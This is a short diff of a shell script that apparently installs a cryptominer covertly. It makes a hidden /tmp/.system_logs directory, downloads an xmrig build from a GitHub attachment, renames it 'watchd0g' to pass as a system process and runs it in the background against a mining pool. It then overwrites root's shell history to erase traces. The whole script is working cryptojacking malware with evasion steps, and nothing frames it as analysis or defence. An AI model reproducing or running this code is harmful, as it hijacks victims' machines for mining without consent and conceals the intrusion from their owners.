@@ -2,6 +2,8 @@
 
 mkdir /tmp/.system_logs
 
+cd /tmp/.system_logs
+
 wget https://github.com/momika233/xmrig/files/15147153/momika233-2024-04-29-xmrig.zip && unzip momika233-2024-04-29-xmrig.zip && mv xmrig watchd0g && rm -rf momika233-2024-04-29-xmrig.zip
 
 chmod 777 /tmp/.system_logs/watchd0g && cd /tmp/.system_logs && ./watchd0g -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u 1668078498 -p x -B && echo "exit" > /root/.zsh_history
